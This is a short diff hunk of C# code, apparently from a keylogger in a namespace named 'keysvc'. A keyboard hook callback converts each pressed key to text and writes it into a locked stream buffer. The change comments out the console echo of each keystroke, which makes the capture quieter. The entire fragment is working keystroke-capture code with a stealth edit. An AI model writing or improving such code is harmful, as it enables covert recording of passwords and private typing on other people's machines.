@@ -114,7 +114,7 @@ namespace keysvc
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
                 int vkCode = Marshal.ReadInt32(lParam);
-                Console.WriteLine((Keys)vkCode);
+                //Console.WriteLine((Keys)vkCode);
                 byte[] buffer = ASCIIEncoding.UTF8.GetBytes(((Keys)vkCode).ToString() + Environment.NewLine);
 
                 lock (streamLock)
